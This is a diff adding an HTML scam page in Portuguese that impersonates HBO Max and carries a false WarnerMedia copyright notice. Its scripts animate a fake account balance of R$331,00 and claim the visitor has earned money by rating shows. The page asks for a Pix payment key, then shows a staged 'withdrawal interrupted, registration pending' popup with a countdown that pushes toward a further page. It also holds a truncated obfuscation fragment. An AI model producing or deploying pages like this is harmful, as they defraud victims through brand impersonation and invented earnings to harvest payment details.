@@ -1,0 +1,820 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>HBO Max</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link rel="stylesheet" href="css/KzPuumnuoNdl.css" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap" rel="stylesheet">
+    <style>
+
+        html, body {
+        overflow-x: hidden;
+        }
+
+        #netflixlogoapp{
+            width: 100px;
+            margin: 20px;
+            margin-top: 25px;
+            z-index: 9999;
+        }
+
+        *{
+            margin: 0px;
+            font-family: "Poppins", sans-serif;
+            padding: 0px;
+        }
+        body{
+            background-image: linear-gradient(to bottom, #040f50, #0c0932, #0c0528);
+        }
+
+        #barranetflix{
+            background: linear-gradient( #000000, rgba(12, 12, 12, 0));
+            display: flex;
+            justify-content: space-between;
+            margin: 0px;
+        }
+        #bannerprincipal{
+            background-image: url('images/ajDhz9m9yXod.png') ;
+            background-position: center; /* Center the image */
+            background-repeat: no-repeat; /* Do not repeat the image */
+            background-size: cover;
+        }
+        #textoprincipal{
+            color: white;
+            width: 95%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-size: 27px;
+        }
+        #ganheassistindocaixa{
+            padding: 5px;
+            text-align: center;
+            font-size: 23px;
+            margin-bottom: 10px;
+            font-weight: 700;
+            margin-top: 10px;
+            background-color: rgb(211, 15, 15);
+            width: 60%;
+        }
+        #textodetalhelogin{
+            font-size: 15px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        #inputtypetext{
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0));
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            -webkit-box-shadow: 0px 0px 44px 10px rgba(0,0,0,0.93);
+            -moz-box-shadow: 0px 0px 44px 10px rgba(0,0,0,0.93);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border:1px solid rgba(255, 255, 255, 0.18);
+            color: white;
+            width: 130%;
+            border-radius: 10px;
+            margin-top: 10px;
+            padding: 13px 15px;
+            font-weight: 700;
+        }
+        #inputtypetextx{
+            border: 2px solid #acacac;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0));
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            -webkit-box-shadow: 0px 0px 44px 10px rgba(0,0,0,0.93);
+            -moz-box-shadow: 0px 0px 44px 10px rgba(0,0,0,0.93);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border:1px solid rgba(255, 255, 255, 0.18);
+            border-radius: 15px;
+            color: white;
+            width: 24%;
+            height: 90px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            border-radius: 14px;
+            margin-top: 20px;
+            padding: 13px 30px;
+            font-weight: 700;
+        }
+        #inputtypetextx:hover{
+            background-color: #002be7;
+            color: white;
+            width: 24%;
+            border-radius: 15px;
+            margin-top: 20px;
+            padding: 13px 30px;
+            font-weight: 700;
+            animation: breathing 2s ease-in-out infinite;
+        }
+        a{
+            text-decoration: none;
+        }
+        #botaoproximaetapa{
+            padding: 15px;
+        font-weight: 700;
+        width: 80%;
+        margin-top: 20px;
+        color: white;
+        border-radius: 15px;
+        font-size: 18px;
+        background-color: #002be7;
+        text-align: center;
+        display: inline-block;
+        text-decoration: none;
+        }
+        #botaoproximaetapaa{
+            padding: 10px;
+            font-weight: 700;
+            width: 70%;
+            margin-top: 10px;
+            color: rgb(211, 15, 15);
+            border-radius: 5px;
+            font-size: 18px;
+            background-color: #00a8e1;
+            border: 1px solid rgb(211, 15, 15);
+        }
+        #botaolucraretapa{
+            background: linear-gradient(rgb(0, 0, 0, 0), #040f50);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 0px 0px 20px 0px;
+            text-align: center;
+        }
+        #botaolucraretapaa{
+            display: flex;
+            justify-content: center;
+            margin-top: -90px;
+            align-items: center;
+            padding: 0px 0px 20px 0px;
+            text-align: center;
+        }
+        #informativo{
+            padding: 10px;
+            margin: 10px;
+            margin-top: 5px;
+            display: flex;
+            margin-left:  -150px;
+            justify-content: center;
+            align-items: center;
+            border-radius: 5px;
+            height: 200px;
+        }
+        #pipocanetflix{
+            width: 30px;
+        }
+        #dinheirologo{
+            width: 60px;
+        }
+        .tvnetflix{
+            width: 90%;
+        }
+        #tvnetflixaax{
+            width: 250px;
+        }
+        #tvnetflixapp{
+            width: 150px;
+            height: 150px;
+            position: relative;
+        }
+        #videomp4net{
+            width: 200px;
+            margin-left: 50px;
+            margin-top: 30px;
+        }
+        #informativo div:first-child {
+            width: 150px;
+            height: 150px;
+            position: relative;
+        }
+        #informativo div:last-child {
+            width: 150px;
+            height: 150px;
+            position: relative;
+            margin-top: -150px;
+            margin-left: 20px;
+        }
+        #textodetalhelogindd{
+            color: white;
+            padding: 30px;
+            font-size: 19px;
+            font-weight: 600;
+            margin-top: -35px;
+            text-align: center;
+        }
+        footer{
+            background-color: #040f50;
+            color: white;
+            height: 120px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding-right: 40px;
+            padding-left: 40px;
+        }
+        #saldolead{
+            margin-right: 20px;
+            padding: 14px 20px;
+            height: 15px;
+            border-radius: 10px;
+            display: flex;
+            margin-top:15px;
+            font-weight: 700;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            z-index: 9999;
+            background-color: rgb(76, 175, 80);
+            transition: background-color 2s ease-in-out; /* Transição suave de cor */
+        }
+        .rating{
+        transform: translate(-50%,-50%) rotateY(180deg);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-top: 30px;
+        margin-left: 60%;
+        }
+
+        .rating input{
+        display: none;
+        }
+
+        .rating label{
+            display: block;
+            cursor: pointer;
+            width: 50px;
+        }
+
+        .rating label:before{
+        content: '\f005';
+        font-family: fontAwesome;
+        position: relative;
+        display: block;
+        font-size: 50px;
+        color: #555555;
+        }
+
+        .rating label:after{
+        content: '\f005';
+        font-family: fontAwesome;
+        position: absolute;
+        display: block;
+        font-size: 50px;
+        color: #db0303;
+        top: 0;
+        opacity: 0;
+        transition: .5;
+        text-shadow: 0 4px 5px rgba(138, 10, 10, 0.658);
+        }
+        .rating label:hover:after,
+        .rating label:hover ~ label:after,
+        .rating input:checked ~ label:after{
+        opacity: 1;
+        }
+        #avaliacaotexto{
+            color: white;
+            font-size: 17px;
+            font-weight: 600;
+        }
+        #avaloacaoserie{
+            margin-top: 10px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        #youtubevideo{
+            margin: 10px;
+            width: 100%;
+            border-radius: 10px;
+            display: flex;
+            justify-content: center;
+            margin-left: 7%;
+            align-items: center;
+        }
+        #simounaonet{
+            margin-top: -12px;
+            display: flex;
+            width: 90%;
+            justify-content: space-between;
+            align-items: center;
+        }
+        #sadoatyiualnet{
+            text-align: center;
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin: 15px;
+            font-weight: 700;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0));
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border:1px solid rgba(255, 255, 255, 0.18);
+            border-radius: 15px;
+            font-size: 30px;
+            color: white;
+            -webkit-box-shadow: 0px 0px 44px 10px rgba(0,0,0,0.93);
+            -moz-box-shadow: 0px 0px 44px 10px rgba(0,0,0,0.93);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        }
+
+        @keyframes breathing {
+        0% {
+        transform: scale(1);
+        }
+        50% {
+        transform: scale(1.03); /* Reduzi a escala para evitar problemas de layout */
+        }
+        100% {
+        transform: scale(1);
+        }
+        }
+
+        #textovidoc {
+        font-size: 13px;
+        text-align: center;
+        font-weight: 300px;
+        color: white;
+        position: relative;
+        margin-top: 30px;
+        margin-bottom: -10px;
+        }
+
+        #pixlogo{
+            width: 20px;
+            margin-top: 13px;
+            margin-bottom: 7px;
+        }
+
+        /* Estilo do popup */
+        #popupBackground {
+            display: none; /* Inicialmente oculto */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0; /* Inicialmente invisível */
+            transition: opacity 0.5s ease; /* Transição suave para aparecer/desaparecer */
+        }
+
+        #popupContent {
+    background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0));
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    -webkit-box-shadow: 0px 0px 44px 10px rgba(0,0,0,0.93);
+    -moz-box-shadow: 0px 0px 44px 10px rgba(0,0,0,0.93);
+    box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+    border:1px solid rgba(255, 255, 255, 0.18);
+    padding: 20px;
+    border-radius: 15px;
+    text-align: center;
+    max-width: 400px;
+    width: 80%;
+    margin-top: 190px;
+    position: fixed;
+    top: 20px; /* Espaçamento entre o popup e a notificação */
+}
+
+        /* Estilo do botão de prosseguir no popup */
+        #prosseguir {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: gray;
+            color: white;
+            text-decoration: none;
+            border-radius: 15px;
+            font-size: 16px;
+            cursor: not-allowed;
+            margin-top: 20px;
+            pointer-events: none; /* Desabilita o botão inicialmente */
+            transition: background-color 0.3s ease;
+            margin-bottom: 10px;
+            animation: breathing 3s ease-in-out infinite;
+        }
+
+        /* Estilo do botão de prosseguir quando habilitado */
+        #prosseguir.enabled {
+            background-color: #4CAF50;
+            cursor: pointer;
+            pointer-events: auto;
+        }
+
+        #popuptexto{
+            color: white;
+            margin-top: 20px;
+            font-size: 20px;
+        }
+
+        #popuptexto2{
+            background: rgb(255, 208, 53);
+            color: rgb(71, 40, 0);
+            border-radius: 10px;
+            margin-right: 10px;
+            margin-left: 10px;
+            padding: 10px;
+            font-size: 12px;
+            margin-bottom: 15px;
+        }
+
+        #popuptexto3{
+            color: white;
+        }
+
+        #linha-horizontal {
+        width: 200px;
+        border: 1px solid #858585;
+        margin: 0 auto;
+        margin-top: 15px;
+        margin-bottom: 20px;
+        }
+
+        #pixlogo{
+            margin-bottom: -17px;
+            margin-top: -7px;
+        }
+
+        #pixlogo2{
+            margin-bottom: 10px;
+            margin-top: 10px;
+            width: 100px;
+        }
+
+
+        #notificacao {
+            visibility: hidden; /* Oculta inicialmente */
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1),
+            rgba(255, 255, 255, 0));
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            -webkit-box-shadow: 0px 0px 44px 10px rgba(0,0,0,0.93);
+            -moz-box-shadow: 0px 0px 44px 10px rgba(0,0,0,0.93);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            max-width: 400px;
+            width: 82%;
+            left: 19px;
+            color: #fff;
+            border-radius: 15px;
+            padding: 16px;
+            position: fixed;
+            z-index: 9999;
+            transform: translateY(-100%); /* Inicialmente fora da tela */
+            transition: visibility 0s, opacity 0.5s ease-in-out, transform 0.5s ease-in-out;
+        }
+    
+
+#notificacao.show {
+    visibility: visible; /* Torna visível */
+    opacity: 1; /* Mostra a notificação */
+    transform: translateY(80px); /* Mover para a posição visível */
+}
+
+#notificacao.hide {
+    visibility: visible; /* Torna visível durante a animação de saída */
+    opacity: 0; /* Torna invisível */
+    transform: translateY(-100%); /* Move para fora da tela */
+}
+
+#solrecebida {
+    font-size: 15px;
+    font-weight: 600;
+    text-align: left;
+    padding-left: 5px;
+}
+
+#soldetalhes {
+    font-size: 10px;
+    text-align: left;
+    padding-left: 5px;
+}
+
+#analise{
+    font-size: 10px;
+    text-align: left;
+    padding-left: 6px;
+    margin-left: 5px;
+    font-weight: bold;
+    margin-top: 3px;
+    width: 125px;
+    padding: 5px;
+    border-radius: 7px;
+    background: rgb(255, 208, 53);
+    color: rgb(71, 40, 0);
+}
+
+
+    </style>
+</head>
+<body>
+    
+<script>
+function mostrarPopup() {
+    // Sua lógica existente para mostrar o popup
+    alert("Popup aberto!"); // Exemplo de popup
+}
+
+function acionarNotificacao() {
+    setTimeout(function() {
+        solicitacaoPopup();
+    }, 3000); // 4000 milissegundos = 4 segundos
+}
+
+function solicitacaoPopup() {
+    // Obter a data e a hora atuais
+    var agora = new Date();
+    var dia = agora.getDate().toString().padStart(2, '0');
+    var mes = (agora.getMonth() + 1).toString().padStart(2, '0');
+    var ano = agora.getFullYear();
+    var horas = agora.getHours().toString().padStart(2, '0');
+    var minutos = agora.getMinutes().toString().padStart(2, '0');
+    
+    // Formatar a data e hora
+    var dataHoraFormatada = dia + '/' + mes + '/' + ano + ' ' + horas + ':' + minutos;
+    
+    // Inserir a data e hora no elemento soldetalhes
+    document.getElementById("soldetalhes").innerHTML = 
+        "ID da Transação: HBOMAX7A3B2C9XQ4L5" + 
+        "<br>" + "Valor do Saque: <b>R$331,00</b> - " + dataHoraFormatada + "</p>";
+    
+    // Mostrar a notificação
+    var notificacao = document.getElementById("notificacao");
+    notificacao.classList.remove("hide"); // Certifica-se de que a notificação está visível antes de mostrar
+    notificacao.classList.add("show");
+
+    // Tocar o áudio
+    var audio = document.getElementById("notificacao-som");
+    audio.play();
+    
+    // Ocultar a notificação após 5 segundos
+    setTimeout(function() {
+        notificacao.classList.remove("show");
+        notificacao.classList.add("hide");
+    }, 10000); // 5000 milissegundos = 5 segundos
+}
+</script>
+
+
+<div id="notificacao" class="notificacao">
+    <audio id="notificacao-som" src="media/JECoO7tWElMr.mp3" preload="auto"></audio>
+    <p id="solrecebida">Sua solicitação foi Interrompida</p>
+    <p id="soldetalhes">Data e Hora</p>
+    <p id="analise">⏳ Cadastro Pendente</p>
+</div>
+
+    <div id="popupBackground">
+        <div id="popupContent">
+            <img src="images/Iym8twlWEanu.png" style="width: 90px" ;="" id="pixlogo" alt="pixlogo">
+            <p id="popuptexto">Você realizou uma<br><b>Solicitação de Saque.</b></p>
+
+            <div id="linha-horizontal"></div>
+
+            <p id="popuptexto2"><b>Sua Solicitação foi interrompida</b><br>[Não foi Possível Identificar seu Cadastro]</p>
+            <p id="popuptexto3">Quer finalizar seu <b>Cadastro</b> <br>e <b>Realizar seu Saque?</b></p>
+            <a href="../hbo13/" id="prosseguir" onclick="fecharPopup()">Sim, quero realizar meu Saque (5s)</a>
+        </div>
+    </div>
+    <script language="Javascript">
+        <!--F7 Sistemas HTML Codificador by f7sistemas.com.br-->
+        <!--
+        document.write(unescape
+        </script>
+    <script>
+        // Função para mostrar o popup
+        function mostrarPopup() {
+            const popup = document.getElementById('popupBackground');
+            const prosseguirButton = document.getElementById('prosseguir');
+            const initialSeconds = 5; // Segundos de espera
+            let secondsLeft = initialSeconds;
+
+            popup.style.display = 'flex';
+            setTimeout(() => {
+                popup.style.opacity = '1'; // Faz o popup aparecer suavemente
+            }, 10); // Delay pequeno para permitir a transição
+
+            // Atualiza o texto do botão a cada segundo
+            const countdownInterval = setInterval(() => {
+                secondsLeft--;
+                prosseguirButton.textContent = `Sim, quero realizar meu Saque (${secondsLeft}s)`;
+                if (secondsLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    prosseguirButton.classList.add('enabled'); // Habilita o botão
+                    prosseguirButton.textContent = 'Sim, quero realizar meu Saque';
+                }
+            }, 1000);
+
+            // Temporizador de 5 segundos antes de habilitar o botão
+            setTimeout(() => {
+                prosseguirButton.classList.add('enabled'); // Habilita o botão
+                prosseguirButton.textContent = 'Sim, quero realizar meu Saque';
+            }, initialSeconds * 1000); // 5 segundos (5000 milissegundos)
+        }
+
+        // Função para fechar o popup
+        function fecharPopup() {
+            const popup = document.getElementById('popupBackground');
+            popup.style.opacity = '0'; // Faz o popup desaparecer suavemente
+            setTimeout(() => {
+                popup.style.display = 'none';
+            }, 500); // Tempo de espera para esconder após a transição
+        }
+    </script>
+
+
+    <div id="bannerprincipal">
+        <div id="barranetflix">
+            <img src="images/luCUVY8ENtTP.png" id="netflixlogoapp">
+            <div id="saldolead" style="background-color: rgb(76, 175, 80);">Saldo: R$ <b id="saldoValor">320,84</b></div>
+        </div> 
+
+
+        <script>
+            window.onload = function() {
+                animarSaldo();
+            };
+            
+            function animarSaldo() {
+                let saldoAtual = 318.76;
+                let saldoFinal = 331.00;
+                let incremento = 0.04; // Quanto cada incremento adiciona ao saldo
+                let intervalo = 10; // Tempo em milissegundos entre os incrementos
+            
+                // Configura o fundo verde no início
+                document.getElementById('saldolead').style.backgroundColor = 'rgb(76, 175, 80)';
+            
+                let intervaloID = setInterval(function() {
+                    saldoAtual += incremento;
+                    if (saldoAtual >= saldoFinal) {
+                        saldoAtual = saldoFinal;
+                        clearInterval(intervaloID);
+            
+                        // Faz a transição para azul quando a contagem termina
+                        document.getElementById('saldolead').style.backgroundColor = '#002be7';
+                    }
+                    document.getElementById('saldoValor').textContent = saldoAtual.toFixed(2).replace('.', ',');
+                }, intervalo);
+            }
+    </script>
+
+        <div id="notificacaodin" style="background-color: #090a41;
+        border: 1px solid #3a3dc4;
+        margin: 10px;
+        border-radius: 15px;
+        color: #ffffff;
+        padding: 10px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        animation: breathing 3s ease-in-out infinite;">
+
+            <p id="textonotifi">Você ganhou <b>R$ 12,24</b></p>
+            <p><b>REALIZE SEU SAQUE</b></p>
+        </div>
+
+        <p id="sadoatyiualnet">
+            <img src="images/UtZrdg5cKwHT.png" ;="" id="pixlogo2" alt="pixlogo2">Saldo: R$ 331,00 <b style="font-size: 15px;
+            margin-top: 10px;
+            margin-right: 15px;
+            margin-left: 15px;
+            margin-bottom: 10px;
+            font-weight: 300;">Parabéns! Você concluiu as <b>primeiras avaliações</b> e está pronto para realizar seu <b>Primeiro Saque.</b></b></p>
+    
+    <div id="avaloacaoserie">
+        <p id="avaliacaotexto">Selecione o tipo da sua chave pix:</p>
+        <div id="simounaonet">
+            <button type="text" id="inputtypetextx" placeholder="Escreva aqui...">
+                <svg xmlns="http://www.w3.org/2000/svg" style="margin-top: 5px;" width="25" height="25" fill="currentColor" class="bi bi-people-fill" viewBox="0 0 16 16">
+                    <path d="M7 14s-1 0-1-1 1-4 5-4 5 3 5 4-1 1-1 1zm4-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6m-5.784 6A2.24 2.24 0 0 1 5 13c0-1.355.68-2.75 1.936-3.72A6.3 6.3 0 0 0 5 9c-4 0-5 3-5 4s1 1 1 1zM4.5 8a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5"></path>
+                  </svg>
+                <p>CPF/ CNPJ</p>
+            </button>
+            <button type="text" id="inputtypetextx" style="margin-left: 5px;" placeholder="Escreva aqui...">
+                <svg xmlns="http://www.w3.org/2000/svg" style="margin-top: 5px;" width="25" height="25" fill="currentColor" class="bi bi-inbox-fill" viewBox="0 0 16 16">
+                    <path d="M4.98 4a.5.5 0 0 0-.39.188L1.54 8H6a.5.5 0 0 1 .5.5 1.5 1.5 0 1 0 3 0A.5.5 0 0 1 10 8h4.46l-3.05-3.812A.5.5 0 0 0 11.02 4zm-1.17-.437A1.5 1.5 0 0 1 4.98 3h6.04a1.5 1.5 0 0 1 1.17.563l3.7 4.625a.5.5 0 0 1 .106.374l-.39 3.124A1.5 1.5 0 0 1 14.117 13H1.883a1.5 1.5 0 0 1-1.489-1.314l-.39-3.124a.5.5 0 0 1 .106-.374z"></path>
+                  </svg>
+                <p>Email</p>
+            </button>
+            <button type="text" id="inputtypetextx" style="margin-left: 5px;" placeholder="Escreva aqui...">
+                <svg xmlns="http://www.w3.org/2000/svg" style="margin-top: 5px;" width="25" height="25" fill="currentColor" class="bi bi-dice-5-fill" viewBox="0 0 16 16">
+                    <path d="M3 0a3 3 0 0 0-3 3v10a3 3 0 0 0 3 3h10a3 3 0 0 0 3-3V3a3 3 0 0 0-3-3zm2.5 4a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0m8 0a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0M12 13.5a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3M5.5 12a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0M8 9.5a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3"></path>
+                  </svg>
+                <p>Aleatória</p>
+            </button>
+            <button type="text" id="inputtypetextx" style="margin-left: 5px;" placeholder="Escreva aqui...">
+                <svg xmlns="http://www.w3.org/2000/svg" style="margin-top: 5px;" width="25" height="25" fill="currentColor" class="bi bi-phone-fill" viewBox="0 0 16 16">
+                    <path d="M3 2a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2zm6 11a1 1 0 1 0-2 0 1 1 0 0 0 2 0"></path>
+                  </svg>
+                <p>Celular</p>
+            </button>
+        </div>
+
+        <script>
+document.querySelectorAll('#simounaonet button').forEach(function(button) {
+    button.addEventListener('click', function() {
+        // Remove a seleção de todos os botões
+        document.querySelectorAll('#simounaonet button').forEach(function(btn) {
+            btn.style.backgroundColor = ''; // ou a cor original dos botões
+        });
+
+        // Aplica a seleção ao botão clicado
+        button.style.backgroundColor = '#002be7'; // Estilo para mostrar que o botão foi selecionado
+    });
+});
+        </script>
+
+        <div id="textovidoc"><p><b>ATENÇÃO:</b> Informe sua Chave Pix corretamente!</p></div>
+        
+    <div id="avaloacaoserie">
+        <input type="text" id="inputtypetext" placeholder="Escreva sua Chave Pix...">
+    </div>
+
+    
+    </div>
+    
+    <div id="botaolucraretapa">
+        <a href="../validate/index.html" id="botaoproximaetapa" onclick="mostrarPopup(); acionarNotificacao(); return false;">SACAR AGORA MESMO</a>
+    </div>
+
+    </div>
+
+    <script>
+        class YouTubeVideo extends HTMLElement {
+            constructor() {
+                super();
+                this.attachShadow({ mode: 'open' });
+                this.shadowRoot.appendChild(this.getStyle());
+                this.addEventListener('click', () => {
+                    this.classList.add('clicked');
+                    this.shadowRoot.appendChild(this.getIframe());
+                });
+            }
+        
+            getStyle() {
+                const style = document.createElement('style');
+                style.textContent = `
+                    :host {
+                        position: relative;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        width: 100%;
+                        max-width: 100%;
+                        aspect-ratio: 16/9;
+                        cursor: pointer;
+                        background: silver url('https://img.youtube.com/vi/${this.getAttribute('video-id')}/0.jpg') no-repeat center / cover;
+                    }
+                    :host:before {
+                        content: '';
+                        width: 15%;
+                        aspect-ratio: 1;
+                        border-radius: 50%;
+                        background: white url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 140 122.88"><polygon points="140,60.97 32,122.88 32,0 140,60.97" fill="black" /></svg>') no-repeat center / 50% 50%;
+                        filter: drop-shadow(0px 0px 16px rgba(0,0,0,0.3));
+                        transition: all 0.3s ease;
+                    }
+                    :host(.clicked):before {
+                        opacity: 0;
+                    }`;
+                return style;
+            }
+        
+            getIframe() {
+                const iframe = document.createElement('iframe');
+                iframe.setAttribute('frameborder', '0');
+                iframe.setAttribute('allow', 'autoplay');
+                iframe.setAttribute('allowfullscreen', '');
+                iframe.style.cssText = `position: absolute; top: 0; left: 0; width: 100%; height: 100%;`;
+                const params = new URLSearchParams({ autoplay: 1, modestbranding: 1, rel: 0, iv_load_policy: 3, showinfo: 0 });
+                ['controls', 'start', 'end', 'loop', 'playlist'].forEach(
+                    attr => { if (this.hasAttribute(attr)) params.set(attr, this.getAttribute(attr)); }
+                );
+                iframe.src = `https://www.youtube-nocookie.com/embed/${this.getAttribute('video-id')}?${params}`;
+                iframe.onload = () => this.style.background = 'transparent';
+                return iframe;
+            }
+        }
+        customElements.define('youtube-video', YouTubeVideo);
+        </script>
+
+<footer>
+    <p style="font-size: 12px; text-align: center; font-weight: 300;">©2024 WarnerMedia Direct Latin America, LLC. Todos os direitos reservados. Max é usado sob licença.</p>
+</footer>
+
+
+
+</body></html>
